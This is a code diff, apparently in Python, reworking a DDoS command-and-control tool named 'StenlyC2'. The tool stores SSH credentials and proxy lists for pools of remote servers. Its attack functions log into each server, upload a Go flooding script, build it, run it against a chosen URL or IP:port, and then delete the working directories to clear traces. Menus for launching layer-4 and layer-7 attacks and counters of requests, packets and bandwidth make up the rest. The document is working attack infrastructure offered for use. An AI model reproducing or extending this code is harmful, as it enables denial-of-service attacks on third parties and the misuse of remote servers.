-                print(f"{COLOR['red']}❌ [{index+1}] {server['host']} | No requests{COLOR['reset']}")
+                with lock:
+                    results['fail'] += 1
+                print(f"{R}[{idx}] {srv['host']} - No Output{D}")
+                results['details'].append({
+                    'host': srv['host'],
+                    'status': 'failed'
+                })
                 
         except Exception as e:
-            results['failed'] += 1
-            print(f"{COLOR['red']}❌ [{index+1}] {server['host']} | Error{COLOR['reset']}")
-        finally:
-            conn.execute("rm -rf /tmp/l7attack")
-            conn.close()
-    
-    # Launch
-    with ThreadPoolExecutor(max_workers=len(servers)) as executor:
-        futures = {executor.submit(attack_server, server, i): i for i, server in enumerate(servers)}
-        for future in as_completed(futures):
+            with lock:
+                results['fail'] += 1
+            print(f"{R}[{idx}] {srv['host']} - Error: {str(e)[:30]}{D}")
             try:
-                future.result()
+                c.exe("rm -rf /tmp/l4attack")
+                c.close()
             except:
                 pass
     
-    total_time = time.time() - start_time
+    ths = []
+    for i, s in enumerate(servers):
+        t = threading.Thread(target=run, args=(s, i+1))
+        t.start()
+        ths.append(t)
+        time.sleep(0.2)
     
-    # Update stats
-    data['stats']['total_attacks'] += 1
-    data['stats']['total_requests'] += results['total_requests']
-    data['stats']['total_bytes'] += results['total_bytes']
-    data['stats']['total_time'] += total_time
-    save_servers(data)
+    for t in ths:
+        t.join()
     
-    # Report
-    avg_rps = results['total_requests'] // duration if duration > 0 else 0
-    avg_gbps = (results['total_bytes'] * 8) / (duration * 1024**3) if duration > 0 else 0
+    elapsed = time.time() - start
     
-    print(f"\n\n{COLOR['cyan']}{COLOR['bold']}╔══════════════════════════════════════════════════════════════════╗{COLOR['reset']}")
-    print(f"{COLOR['cyan']}{COLOR['bold']}║                     L7 ATTACK STATISTICS                         ║{COLOR['reset']}")
-    print(f"{COLOR['cyan']}{COLOR['bold']}╠══════════════════════════════════════════════════════════════════╣{COLOR['reset']}")
-    print(f"{COLOR['cyan']}{COLOR['bold']}║  🎯 Target: {target_url[:50]:<50}║{COLOR['reset']}")
-    print(f"{COLOR['cyan']}{COLOR['bold']}║  📦 Requests: {format_number(results['total_requests']):>30}                  ║{COLOR['reset']}")
-    print(f"{COLOR['cyan']}{COLOR['bold']}║  📊 Data: {results['total_bytes']/1024/1024/1024:>10.2f} GB                              ║{COLOR['reset']}")
-    print(f"{COLOR['cyan']}{COLOR['bold']}║  ⚡ Avg RPS: {format_number(avg_rps):>30}                  ║{COLOR['reset']}")
-    print(f"{COLOR['cyan']}{COLOR['bold']}║  🌐 Avg GBPS: {avg_gbps:>30.2f}                  ║{COLOR['reset']}")
-    print(f"{COLOR['cyan']}{COLOR['bold']}╚══════════════════════════════════════════════════════════════════╝{COLOR['reset']}")
+    data['stats']['attacks'] += 1
+    data['stats']['packets'] += results['packets']
+    data['stats']['bytes'] += results['bytes']
+    data['stats']['time'] += elapsed
+    
+    if data['stats']['attacks'] > 0:
+        data['stats']['success_rate'] = (results['ok'] / len(servers)) * 100
+    
+    data['attack_history'].append({
+        'type': 'L4',
+        'target': f"{ip}:{port}",
+        'method': method,
+        'duration': duration,
+        'servers': len(servers),
+        'success': results['ok'],
+        'packets': results['packets'],
+        'timestamp': time.time()
+    })
+    
+    save_db(data)
+    
+    avg_pps = results['packets'] // duration if duration > 0 else 0
+    gbps = (results['bytes'] * 8) / (duration * 1024**3) if duration > 0 else 0
+    
+    print(f"\n{BD}{G}=== L4 ATTACK RESULT ==={D}")
+    print(f"Success: {results['ok']}/{len(servers)}")
+    print(f"Total Packets: {fmt_num(results['packets'])}")
+    print(f"Total Data: {results['bytes']/1024/1024/1024:.2f} GB")
+    print(f"Avg PPS: {fmt_num(avg_pps)}")
+    print(f"Avg GBPS: {gbps:.2f}")
 
-# ================= [ MENU SYSTEMS ] =================
-def menu_password_servers(data, mode="both"):
-    """Manage password servers - SUPPORTS BOTH L4 AND L7"""
+def attack_l7(servers, url, duration, method, threads, data):
+    print(f"\n{BD}{P}>> L7 ATTACK DEPLOYMENT <<{D}")
+    print(f"{C}Target: {url}{D}")
+    print(f"{C}Method: {method} | Duration: {duration}s | Threads/Srv: {threads}{D}")
+    print(f"{C}Servers: {len(servers)}{D}\n")
+    
+    script = gen_l7(url, duration, method, threads)
+    if not script:
+        input(f"\n{R}Press Enter...{D}")
+        return
+    
+    proxies = data.get('proxies', [])
+    active_proxies = [p['url'] for p in proxies if p.get('active')]
+    proxy_content = '\n'.join(active_proxies[:500])
+    
+    results = {
+        'requests': 0,
+        'bytes': 0,
+        'ok': 0,
+        'fail': 0,
+        'details': []
+    }
+    
+    lock = threading.Lock()
+    start = time.time()
+    
+    def run(srv, idx):
+        c = SSH(srv)
+        if not c.connect(15):
+            with lock:
+                results['fail'] += 1
+            print(f"{R}[{idx}] {srv['host']} - Connection Failed{D}")
+            return
+        
+        try:
+            c.exe("mkdir -p /tmp/l7attack && rm -f /tmp/l7attack/*")
+            
+            if proxy_content:
+                c.upload(proxy_content, '/tmp/l7attack/proxy.txt')
+            
+            c.upload(script, '/tmp/l7attack/attack.go')
+            
+            prep = (
+                "export PATH=$PATH:/usr/local/go/bin && "
+                "export GOPROXY=https://proxy.golang.org,direct && "
+                "cd /tmp/l7attack && "
+                "go mod init attack 2>/dev/null || true && "
+                "go get golang.org/x/net/http2@latest 2>&1 | tail -1 && "
+                "go get golang.org/x/net/proxy@latest 2>&1 | tail -1 && "
+                "go get github.com/gorilla/websocket@latest 2>&1 | tail -1"
+            )
+            c.exe(prep, 60)
+            
+            comp = (
+                "export PATH=$PATH:/usr/local/go/bin && "
+                "cd /tmp/l7attack && "
+                "go build -ldflags='-s -w' -o attack attack.go 2>&1; "
+                "echo BUILD:$?"
+            )
+            comp_out = c.exe(comp, 60)
+            
+            if "BUILD:0" not in comp_out:
+                with lock:
+                    results['fail'] += 1
+                print(f"{R}[{idx}] {srv['host']} - Build Failed{D}")
+                c.exe("rm -rf /tmp/l7attack")
+                c.close()
+                return
+            
+            run_cmd = (
+                "export PATH=$PATH:/usr/local/go/bin && "
+                "cd /tmp/l7attack && "
+                "ulimit -n 65535 2>/dev/null && "
+                "nice -n -20 ./attack 2>&1"
+            )
+            out = c.exe(run_cmd, duration + 30, True)
+            
+            c.exe("rm -rf /tmp/l7attack")
+            c.close()
+            
+            req = 0
+            byt = 0
+            rps = 0
+            
+            m = re.search(r'TOTAL REQUESTS:\s+([\d.]+[KMBT]?)', out)
+            if m:
+                req = parse_num(m.group(1))
+            
+            m = re.search(r'TOTAL DATA:\s+([\d.]+)\s+MB', out)
+            if m:
+                byt = float(m.group(1)) * 1024 * 1024
+            
+            m = re.search(r'AVERAGE RPS:\s+([\d.]+)', out)
+            if m:
+                rps = float(m.group(1))
+            
+            with lock:
+                results['requests'] += req
+                results['bytes'] += byt
+            
+            if req > 0:
+                with lock:
+                    results['ok'] += 1
+                print(f"{G}[{idx}] {srv['host']} | Requests: {fmt_num(req)} | RPS: {rps:.0f}{D}")
+                results['details'].append({
+                    'host': srv['host'],
+                    'requests': req,
+                    'bytes': byt,
+                    'status': 'success'
+                })
+            else:
+                with lock:
+                    results['fail'] += 1
+                print(f"{R}[{idx}] {srv['host']} - No Output{D}")
+                results['details'].append({
+                    'host': srv['host'],
+                    'status': 'failed'
+                })
+                
+        except Exception as e:
+            with lock:
+                results['fail'] += 1
+            print(f"{R}[{idx}] {srv['host']} - Error: {str(e)[:30]}{D}")
+            try:
+                c.exe("rm -rf /tmp/l7attack")
+                c.close()
+            except:
+                pass
+    
+    ths = []
+    for i, s in enumerate(servers):
+        t = threading.Thread(target=run, args=(s, i+1))
+        t.start()
+        ths.append(t)
+        time.sleep(0.2)
+    
+    for t in ths:
+        t.join()
+    
+    elapsed = time.time() - start
+    
+    data['stats']['attacks'] += 1
+    data['stats']['requests'] += results['requests']
+    data['stats']['bytes'] += results['bytes']
+    data['stats']['time'] += elapsed
+    
+    data['attack_history'].append({
+        'type': 'L7',
+        'target': url,
+        'method': method,
+        'duration': duration,
+        'servers': len(servers),
+        'success': results['ok'],
+        'requests': results['requests'],
+        'timestamp': time.time()
+    })
+    
+    save_db(data)
+    
+    avg_rps = results['requests'] // duration if duration > 0 else 0
+    gbps = (results['bytes'] * 8) / (duration * 1024**3) if duration > 0 else 0
+    
+    print(f"\n{BD}{G}=== L7 ATTACK RESULT ==={D}")
+    print(f"Success: {results['ok']}/{len(servers)}")
+    print(f"Total Requests: {fmt_num(results['requests'])}")
+    print(f"Total Data: {results['bytes']/1024/1024/1024:.2f} GB")
+    print(f"Avg RPS: {fmt_num(avg_rps)}")
+    print(f"Avg GBPS: {gbps:.2f}")
+
+def menu_pwd(data, mode):
     while True:
-        clear_screen()
-        print_banner()
-        print(f"{COLOR['green']}🔒 PASSWORD SERVERS MANAGEMENT{COLOR['reset']}")
-        print(f"{COLOR['dim']}Mode: {mode.upper()}{COLOR['reset']}\n")
+        banner()
+        print(f"{BD}{Y}PASSWORD SERVERS MANAGEMENT [{mode.upper()}]{D}\n")
         
-        pwd_servers = data.get('servers_password', [])
-        if not pwd_servers:
-            print("No password servers.\n")
-        else:
-            active_count = len([s for s in pwd_servers if s.get('active')])
-            print(f"Total: {len(pwd_servers)} | Active: {active_count}\n")
-            for i, s in enumerate(pwd_servers, 1):
-                status = "✅" if s.get('active') else "⏳"
-                l4 = "L4" if s.get('l4_capable') else "--"
-                l7 = "L7" if s.get('l7_capable') else "--"
-                print(f"{status} {i}. {s['host']} - {s['username']} [{l4}|{l7}]")
+        srvs = data['servers_pwd']
+        active = len([s for s in srvs if s.get('active')])
+        total_bw = sum([s.get('bw', 0) for s in srvs if s.get('active')])
         
-        print(f"\n{COLOR['cyan']}Options:{COLOR['reset']}")
-        print("1️⃣  Add Server")
-        print("2️⃣  Bulk Add from File")
-        print("3️⃣  Remove Server")
-        if mode in ["l4", "both"]:
-            print("4️⃣  Test Server (L4 Mode)")
-            print("5️⃣  Test All (L4 Mode)")
-        if mode in ["l7", "both"]:
-            print("6️⃣  Test Server (L7 Mode)")
-            print("7️⃣  Test All (L7 Mode)")
-        print("8️⃣  Back")
+        print(f"Total: {len(srvs)} | Active: {active} | BW: {total_bw}Mbps\n")
         
-        choice = input(f"\n{COLOR['yellow']}Pilih: {COLOR['reset']}")
+        for i, s in enumerate(srvs, 1):
+            st = f"{G}ON{D}" if s.get('active') else f"{R}OFF{D}"
+            cap = ""
+            if mode == 'l4':
+                cap = f"{C}L4{D}" if s.get('l4') else f"{DM}--{D}"
+            else:
+                cap = f"{P}L7{D}" if s.get('l7') else f"{DM}--{D}"
+            print(f"{i}. {s['host']} [{st}] [{cap}] {s.get('cpu', '?')}c")
         
-        if choice == '1':
-            host = input("Host/IP: ")
-            username = input("Username: ")
-            password = input("Password: ")
-            port = input("Port SSH (22): ") or "22"
-            server = {
-                'host': host, 'username': username, 'password': password,
-                'port': int(port), 'auth_type': 'password', 'added': time.time(),
-                'active': False, 'l4_capable': False, 'l7_capable': False
-            }
-            data['servers_password'].append(server)
-            save_servers(data)
-            print(f"{COLOR['green']}✅ Added{COLOR['reset']}")
-            time.sleep(1)
+        print(f"\n{BD}1{D}.Add {BD}2{D}.Bulk {BD}3{D}.Del {BD}4{D}.Test {BD}5{D}.TestAll {BD}0{D}.Back")
+        ch = input(f"\n{Y}StenlyC2/PWD> {D}")
+        
+        if ch == '1':
+            h = input("Host: ")
+            u = input("Username: ")
+            p = input("Password: ")
+            port = int(input("Port[22]: ") or "22")
+            srvs.append({
+                'host': h, 'username': u, 'password': p, 'port': port,
+                'auth_type': 'password', 'active': False, 'added': time.time()
+            })
+            save_db(data)
+            print(f"{G}[+] Added{D}")
+            time.sleep(0.5)
             
-        elif choice == '2':
-            print("Format: host:port:username:password")
-            path = input("File path: ")
-            try:
+        elif ch == '2':
+            path = input("File (host:port:user:pass): ")
+            if os.path.exists(path):
+                cnt = 0
                 with open(path) as f:
-                    count = 0
                     for line in f:
-                        if line.strip() and not line.startswith('#'):
-                            parts = line.strip().split(':')
+                        line = line.strip()
+                        if line and not line.startswith('#'):
+                            parts = line.split(':')
                             if len(parts) >= 4:
-                                server = {
-                                    'host': parts[0], 'port': int(parts[1]),
-                                    'username': parts[2], 'password': ':'.join(parts[3:]),
-                                    'auth_type': 'password', 'added': time.time(),
-                                    'active': False, 'l4_capable': False, 'l7_capable': False
-                                }
-                                data['servers_password'].append(server)
-                                count += 1
-                save_servers(data)
-                print(f"{COLOR['green']}✅ Added {count} servers{COLOR['reset']}")
-            except Exception as e:
-                print(f"{COLOR['red']}❌ Error: {e}{COLOR['reset']}")
-            time.sleep(2)
-            
-        elif choice == '3':
-            if not pwd_servers:
-                print("No servers"); time.sleep(1); continue
-            for i, s in enumerate(pwd_servers, 1):
-                print(f"{i}. {s['host']}")
-            try:
-                idx = int(input("Remove #: ")) - 1
-                if 0 <= idx < len(pwd_servers):
-                    removed = data['servers_password'].pop(idx)
-                    save_servers(data)
-                    print(f"{COLOR['green']}✅ Removed {removed['host']}{COLOR['reset']}")
-            except:
-                pass
-            time.sleep(1)
-            
-        elif choice == '4' and mode in ["l4", "both"]:
-            if not pwd_servers:
-                print("No servers"); time.sleep(1); continue
-            for i, s in enumerate(pwd_servers, 1):
-                print(f"{i}. {s['host']}")
-            try:
-                idx = int(input("Test #: ")) - 1
-                if 0 <= idx < len(pwd_servers):
-                    if test_server_l4(pwd_servers[idx]):
-                        pwd_servers[idx]['active'] = True
-                    save_servers(data)
-                    input("\nEnter...")
-            except:
-                pass
+                                srvs.append({
+                                    'host': parts[0],
+                                    'port': int(parts[1]),
+                                    'username': parts[2],
+                                    'password': ':'.join(parts[3:]),
+                                    'auth_type': 'password',
+                                    'active': False,
+                                    'added': time.time()
+                                })
+                                cnt += 1
+                save_db(data)
+                print(f"{G}[+] Added {cnt} servers{D}")
+                time.sleep(1)
                 
-        elif choice == '5' and mode in ["l4", "both"]:
-            print(f"\n{COLOR['yellow']}Testing L4 capability...{COLOR['reset']}")
-            for i, server in enumerate(pwd_servers):
-                if test_server_l4(server):
-                    server['active'] = True
-                    server['l4_capable'] = True
+        elif ch == '3':
+            if srvs:
+                try:
+                    idx = int(input("Delete #:")) - 1
+                    if 0 <= idx < len(srvs):
+                        del srvs[idx]
+                        save_db(data)
+                        print(f"{G}[+] Deleted{D}")
+                except:
+                    pass
                 time.sleep(0.5)
-            save_servers(data)
-            input("\nEnter...")
-            
-        elif choice == '6' and mode in ["l7", "both"]:
-            if not pwd_servers:
-                print("No servers"); time.sleep(1); continue
-            for i, s in enumerate(pwd_servers, 1):
-                print(f"{i}. {s['host']}")
-            try:
-                idx = int(input("Test #: ")) - 1
-                if 0 <= idx < len(pwd_servers):
-                    if test_server_l7(pwd_servers[idx]):
-                        pwd_servers[idx]['active'] = True
-                    save_servers(data)
-                    input("\nEnter...")
-            except:
-                pass
                 
-        elif choice == '7' and mode in ["l7", "both"]:
-            print(f"\n{COLOR['yellow']}Testing L7 capability...{COLOR['reset']}")
-            for i, server in enumerate(pwd_servers):
-                if test_server_l7(server):
-                    server['active'] = True
-                    server['l7_capable'] = True
-                time.sleep(0.5)
-            save_servers(data)
-            input("\nEnter...")
-            
-        elif choice == '8':
+        elif ch == '4':
+            if srvs:
+                try:
+                    idx = int(input("Test #:")) - 1
+                    if 0 <= idx < len(srvs):
+                        if mode == 'l4':
+                            test_l4(srvs[idx])
+                        else:
+                            test_l7(srvs[idx])
+                        save_db(data)
+                        input(f"\n{G}Press Enter...{D}")
+                except Exception as e:
+                    print(f"{R}[-] {e}{D}")
+                    time.sleep(1)
+                    
+        elif ch == '5':
+            if srvs:
+                print(f"\n{Y}[*] Testing all...{D}")
+                for s in srvs:
+                    if mode == 'l4':
+                        test_l4(s)
+                    else:
+                        test_l7(s)
+                    save_db(data)
+                input(f"\n{G}Press Enter...{D}")
+                
+        elif ch == '0':
             break
 
-def menu_key_servers(data, mode="both"):
-    """Manage SSH Key servers - SUPPORTS BOTH"""
-    global DEFAULT_KEY_FILE
-    
+def menu_key(data, mode):
+    global DEFAULT_KEY
     while True:
-        clear_screen()
-        print_banner()
-        print(f"{COLOR['blue']}🔑 SSH KEY SERVERS MANAGEMENT{COLOR['reset']}")
-        print(f"{COLOR['dim']}Mode: {mode.upper()}{COLOR['reset']}\n")
+        banner()
+        print(f"{BD}{Y}SSH KEY SERVERS MANAGEMENT [{mode.upper()}]{D}\n")
         
-        key_servers = data.get('servers_key', [])
-        if not key_servers:
-            print("No SSH key servers.\n")
-        else:
-            active_count = len([s for s in key_servers if s.get('active')])
-            print(f"Total: {len(key_servers)} | Active: {active_count}\n")
-            for i, s in enumerate(key_servers, 1):
-                status = "✅" if s.get('active') else "⏳"
-                l4 = "L4" if s.get('l4_capable') else "--"
-                l7 = "L7" if s.get('l7_capable') else "--"
-                print(f"{status} {i}. {s['host']} [{l4}|{l7}]")
+        srvs = data['servers_key']
+        active = len([s for s in srvs if s.get('active')])
         
-        print(f"\n{COLOR['cyan']}Options:{COLOR['reset']}")
-        print("1️⃣  Add Server")
-        print("2️⃣  Bulk Add from File")
-        print("3️⃣  Remove Server")
-        if mode in ["l4", "both"]:
-            print("4️⃣  Test Server (L4 Mode)")
-            print("5️⃣  Test All (L4 Mode)")
-        if mode in ["l7", "both"]:
-            print("6️⃣  Test Server (L7 Mode)")
-            print("7️⃣  Test All (L7 Mode)")
-        print("8️⃣  Set Global Key Path")
-        print("9️⃣  Back")
+        print(f"Total: {len(srvs)} | Active: {active} | Key: {os.path.basename(DEFAULT_KEY)}\n")
         
-        choice = input(f"\n{COLOR['yellow']}Pilih: {COLOR['reset']}")
+        for i, s in enumerate(srvs, 1):
+            st = f"{G}ON{D}" if s.get('active') else f"{R}OFF{D}"
+            cap = ""
+            if mode == 'l4':
+                cap = f"{C}L4{D}" if s.get('l4') else f"{DM}--{D}"
+            else:
+                cap = f"{P}L7{D}" if s.get('l7') else f"{DM}--{D}"
+            print(f"{i}. {s['host']} [{st}] [{cap}]")
         
-        if choice == '1':
-            host = input("Host/IP: ")
-            username = input("Username: ")
-            key_file = input(f"Key path [{DEFAULT_KEY_FILE}]: ") or DEFAULT_KEY_FILE
-            port = input("Port (22): ") or "22"
-            server = {
-                'host': host, 'username': username, 'key_file': key_file,
-                'port': int(port), 'auth_type': 'key', 'added': time.time(),
-                'active': False, 'l4_capable': False, 'l7_capable': False
-            }
-            data['servers_key'].append(server)
-            save_servers(data)
-            print(f"{COLOR['green']}✅ Added{COLOR['reset']}")
-            time.sleep(1)
+        print(f"\n{BD}1{D}.Add {BD}2{D}.Bulk {BD}3{D}.Del {BD}4{D}.Test {BD}5{D}.TestAll {BD}6{D}.SetKey {BD}0{D}.Back")
+        ch = input(f"\n{Y}StenlyC2/KEY> {D}")
+        
+        if ch == '1':
+            h = input("Host: ")
+            u = input("Username: ")
+            k = input(f"Key[{DEFAULT_KEY}]: ") or DEFAULT_KEY
+            port = int(input("Port[22]: ") or "22")
+            srvs.append({
+                'host': h, 'username': u, 'key_file': k, 'port': port,
+                'auth_type': 'key', 'active': False, 'added': time.time()
+            })
+            save_db(data)
+            print(f"{G}[+] Added{D}")
+            time.sleep(0.5)
             
-        elif choice == '2':
-            print("Format: host:port:username:key_path")
-            path = input("File: ")
-            try:
+        elif ch == '2':
+            path = input("File (host:port:user:key_path): ")
+            if os.path.exists(path):
+                cnt = 0
                 with open(path) as f:
-                    count = 0
                     for line in f:
-                        if line.strip() and not line.startswith('#'):
-                            parts = line.strip().split(':')
+                        line = line.strip()
+                        if line and not line.startswith('#'):
+                            parts = line.split(':')
                             if len(parts) >= 4:
-                                server = {
-                                    'host': parts[0], 'port': int(parts[1]),
-                                    'username': parts[2], 'key_file': ':'.join(parts[3:]),
-                                    'auth_type': 'key', 'added': time.time(),
-                                    'active': False, 'l4_capable': False, 'l7_capable': False
-                                }
-                                data['servers_key'].append(server)
-                                count += 1
-                save_servers(data)
-                print(f"{COLOR['green']}✅ Added {count} servers{COLOR['reset']}")
-            except Exception as e:
-                print(f"{COLOR['red']}❌ {e}{COLOR['reset']}")
-            time.sleep(2)
-            
-        elif choice == '3':
-            if not key_servers:
-                print("No servers"); time.sleep(1); continue
-            for i, s in enumerate(key_servers, 1):
-                print(f"{i}. {s['host']}")
-            try:
-                idx = int(input("Remove #: ")) - 1
-                if 0 <= idx < len(key_servers):
-                    data['servers_key'].pop(idx)
-                    save_servers(data)
-                    print(f"{COLOR['green']}✅ Removed{COLOR['reset']}")
-            except:
-                pass
-            time.sleep(1)
-            
-        elif choice == '4' and mode in ["l4", "both"]:
-            if not key_servers:
-                print("No servers"); time.sleep(1); continue
-            for i, s in enumerate(key_servers, 1):
-                print(f"{i}. {s['host']}")
-            try:
-                idx = int(input("Test #: ")) - 1
-                if 0 <= idx < len(key_servers):
-                    if test_server_l4(key_servers[idx]):
-                        key_servers[idx]['active'] = True
-                    save_servers(data)
-                    input("\nEnter...")
-            except:
-                pass
+                                srvs.append({
+                                    'host': parts[0],
+                                    'port': int(parts[1]),
+                                    'username': parts[2],
+                                    'key_file': ':'.join(parts[3:]),
+                                    'auth_type': 'key',
+                                    'active': False,
+                                    'added': time.time()
+                                })
+                                cnt += 1
+                save_db(data)
+                print(f"{G}[+] Added {cnt} servers{D}")
+                time.sleep(1)
                 
-        elif choice == '5' and mode in ["l4", "both"]:
-            print(f"\n{COLOR['yellow']}Testing L4...{COLOR['reset']}")
-            for server in key_servers:
-                if test_server_l4(server):
-                    server['active'] = True
-                    server['l4_capable'] = True
-            save_servers(data)
-            input("\nEnter...")
-            
-        elif choice == '6' and mode in ["l7", "both"]:
-            if not key_servers:
-                print("No servers"); time.sleep(1); continue
-            for i, s in enumerate(key_servers, 1):
-                print(f"{i}. {s['host']}")
-            try:
-                idx = int(input("Test #: ")) - 1
-                if 0 <= idx < len(key_servers):
-                    if test_server_l7(key_servers[idx]):
-                        key_servers[idx]['active'] = True
-                    save_servers(data)
-                    input("\nEnter...")
-            except:
-                pass
+        elif ch == '3':
+            if srvs:
+                try:
+                    idx = int(input("Delete #:")) - 1
+                    if 0 <= idx < len(srvs):
+                        del srvs[idx]
+                        save_db(data)
+                        print(f"{G}[+] Deleted{D}")
+                except:
+                    pass
+                time.sleep(0.5)
                 
-        elif choice == '7' and mode in ["l7", "both"]:
-            print(f"\n{COLOR['yellow']}Testing L7...{COLOR['reset']}")
-            for server in key_servers:
-                if test_server_l7(server):
-                    server['active'] = True
-                    server['l7_capable'] = True
-            save_servers(data)
-            input("\nEnter...")
+        elif ch == '4':
+            if srvs:
+                try:
+                    idx = int(input("Test #:")) - 1
+                    if 0 <= idx < len(srvs):
+                        if mode == 'l4':
+                            test_l4(srvs[idx])
+                        else:
+                            test_l7(srvs[idx])
+                        save_db(data)
+                        input(f"\n{G}Press Enter...{D}")
+                except Exception as e:
+                    print(f"{R}[-] {e}{D}")
+                    time.sleep(1)
+                    
+        elif ch == '5':
+            if srvs:
+                print(f"\n{Y}[*] Testing all...{D}")
+                for s in srvs:
+                    if mode == 'l4':
+                        test_l4(s)
+                    else:
+                        test_l7(s)
+                    save_db(data)
+                input(f"\n{G}Press Enter...{D}")
+                
+        elif ch == '6':
+            DEFAULT_KEY = input(f"Key path[{DEFAULT_KEY}]: ") or DEFAULT_KEY
+            print(f"{G}[+] Updated{D}")
+            time.sleep(0.5)
             
-        elif choice == '8':
-            new_key = input(f"Global key path [{DEFAULT_KEY_FILE}]: ") or DEFAULT_KEY_FILE
-            DEFAULT_KEY_FILE = new_key
-            print(f"{COLOR['green']}✅ Updated{COLOR['reset']}")
-            time.sleep(1)
-            
-        elif choice == '9':
+        elif ch == '0':
             break
 
-def menu_proxies(data):
-    """Manage proxies untuk L7"""
+def menu_proxy(data):
     while True:
-        clear_screen()
-        print_banner()
-        print(f"{COLOR['cyan']}🌐 PROXY MANAGEMENT (For L7){COLOR['reset']}\n")
+        banner()
+        print(f"{BD}{C}PROXY MANAGEMENT{D}\n")
         
-        proxies = data.get('proxies', [])
-        print(f"Total: {len(proxies)} | Active: {len([p for p in proxies if p.get('active')])}\n")
+        px = data.get('proxies', [])
+        active = len([p for p in px if p.get('active')])
         
-        print("1️⃣  Load from File")
-        print("2️⃣  Add Single")
-        print("3️⃣  Test All")
-        print("4️⃣  Remove Dead")
-        print("5️⃣  Back")
+        print(f"Total: {len(px)} | Active: {active}\n")
         
-        choice = input(f"\n{COLOR['yellow']}Pilih: {COLOR['reset']}")
+        for i, p in enumerate(px[:10], 1):
+            st = f"{G}ON{D}" if p.get('active') else f"{R}OFF{D}"
+            print(f"{i}. {p['url'][:40]}... [{st}]")
         
-        if choice == '1':
+        if len(px) > 10:
+            print(f"... and {len(px)-10} more")
+        
+        print(f"\n{BD}1{D}.LoadFile {BD}2{D}.Add {BD}3{D}.TestAll {BD}4{D}.Clean {BD}5{D}.Export {BD}0{D}.Back")
+        ch = input(f"\n{Y}StenlyC2/PROXY> {D}")
+        
+        if ch == '1':
             path = input("File (ip:port per line): ")
             if os.path.exists(path):
+                cnt = 0
                 with open(path) as f:
                     for line in f:
                         line = line.strip()
                         if line and ':' in line:
                             if not line.startswith('http'):
                                 line = f"http://{line}"
-                            data['proxies'].append({
-                                'url': line, 'active': True, 'added': time.time()
+                            px.append({
+                                'url': line,
+                                'active': True,
+                                'added': time.time()
                             })
-                save_servers(data)
-                print(f"{COLOR['green']}✅ Loaded{COLOR['reset']}")
-            time.sleep(1)
+                            cnt += 1
+                save_db(data)
+                print(f"{G}[+] Loaded {cnt} proxies{D}")
+                time.sleep(1)
+                
+        elif ch == '2':
+            p = input("Proxy (ip:port): ")
+            if ':' in p:
+                if not p.startswith('http'):
+                    p = f"http://{p}"
+                px.append({
+                    'url': p,
+                    'active': True,
+                    'added': time.time()
+                })
+                save_db(data)
+                print(f"{G}[+] Added{D}")
+                time.sleep(0.5)
+                
+        elif ch == '3':
+            print(f"{Y}[*] Testing proxies...{D}")
+            def test_one(proxy, idx):
+                try:
+                    import urllib.request
+                    opener = urllib.request.build_opener(
+                        urllib.request.ProxyHandler({'http': proxy['url'], 'https': proxy['url']})
+                    )
+                    opener.addheaders = [('User-Agent', 'Mozilla/5.0')]
+                    start = time.time()
+                    opener.open('http://httpbin.org/ip', timeout=10)
+                    proxy['latency'] = time.time() - start
+                    proxy['active'] = True
+                    print(f"{G}[{idx}] {proxy['url'][:30]}... OK ({proxy['latency']:.1f}s){D}")
+                except:
+                    proxy['active'] = False
+                    print(f"{R}[{idx}] {proxy['url'][:30]}... FAIL{D}")
             
-        elif choice == '2':
-            proxy = input("Proxy (ip:port): ")
-            if ':' in proxy:
-                if not proxy.startswith('http'):
-                    proxy = f"http://{proxy}"
-                data['proxies'].append({'url': proxy, 'active': True})
-                save_servers(data)
-            time.sleep(1)
+            ths = []
+            for i, p in enumerate(px[:20]):
+                t = threading.Thread(target=test_one, args=(p, i+1))
+                t.start()
+                ths.append(t)
+                time.sleep(0.1)
+            for t in ths:
+                t.join()
+            save_db(data)
+            input(f"\n{G}Press Enter...{D}")
             
-        elif choice == '3':
-            print(f"{COLOR['yellow']}Testing...{COLOR['reset']}")
-            # Simplified test
-            for p in data['proxies'][:20]:  # Test 20 saja
-                p['active'] = True  # Simulate
-            save_servers(data)
-            time.sleep(2)
+        elif ch == '4':
+            data['proxies'] = [p for p in px if p.get('active')]
+            save_db(data)
+            print(f"{G}[+] Cleaned{D}")
+            time.sleep(0.5)
             
-        elif choice == '4':
-            data['proxies'] = [p for p in data['proxies'] if p.get('active')]
-            save_servers(data)
-            print(f"{COLOR['green']}✅ Cleaned{COLOR['reset']}")
-            time.sleep(1)
+        elif ch == '5':
+            with open(PROXY_FILE, 'w') as f:
+                for p in px:
+                    f.write(p['url'] + '\n')
+            print(f"{G}[+] Exported to {PROXY_FILE}{D}")
+            time.sleep(0.5)
             
-        elif choice == '5':
+        elif ch == '0':
             break
 
-def menu_launch_l4(data):
-    """Launch L4 Attack (attack.go)"""
-    pwd_active = [s for s in data.get('servers_password', []) if s.get('active') or s.get('l4_capable')]
-    key_active = [s for s in data.get('servers_key', []) if s.get('active') or s.get('l4_capable')]
+def launch_l4(data):
+    pwd = [s for s in data['servers_pwd'] if s.get('active') or s.get('l4')]
+    key = [s for s in data['servers_key'] if s.get('active') or s.get('l4')]
     
-    if not pwd_active and not key_active:
-        print(f"{COLOR['red']}❌ No L4 capable servers!{COLOR['reset']}")
-        input("\nEnter...")
+    if not pwd and not key:
+        print(f"{R}[-] No L4 capable servers!{D}")
+        input()
         return
     
-    clear_screen()
-    print_banner()
-    print(f"{COLOR['red']}🎯 LAUNCH L4 ATTACK (UDP/SAMP){COLOR['reset']}\n")
-    print(f"🔒 Password: {len(pwd_active)} | 🔑 Key: {len(key_active)}")
+    banner()
+    print(f"{BD}{R}LAUNCH L4 ATTACK{D}\n")
     
-    print(f"\n{COLOR['bold']}Select pool:{COLOR['reset']}")
-    print("1️⃣  Password Servers Only")
-    print("2️⃣  SSH Key Servers Only")
-    print("3️⃣  ALL Servers")
+    total_cpu = sum([s.get('cpu', 2) for s in pwd + key])
+    total_bw = sum([s.get('bw', 0) for s in pwd + key])
     
-    choice = input("Choice: ")
-    if choice == '1':
-        servers = pwd_active
-    elif choice == '2':
-        servers = key_active
+    print(f"PWD: {len(pwd)} | KEY: {len(key)} | CPU: {total_cpu} cores | BW: {total_bw}Mbps\n")
+    
+    print(f"{BD}1{D}.Password Only")
+    print(f"{BD}2{D}.SSH Key Only")
+    print(f"{BD}3{D}.ALL Servers")
+    ch = input(f"\n{Y}Select pool: {D}")
+    
+    if ch == '1':
+        srvs = pwd
+    elif ch == '2':
+        srvs = key
     else:
-        servers = pwd_active + key_active
+        srvs = pwd + key
     
-    if not servers:
-        print("No servers selected"); input("\nEnter..."); return
+    if not srvs:
+        return
     
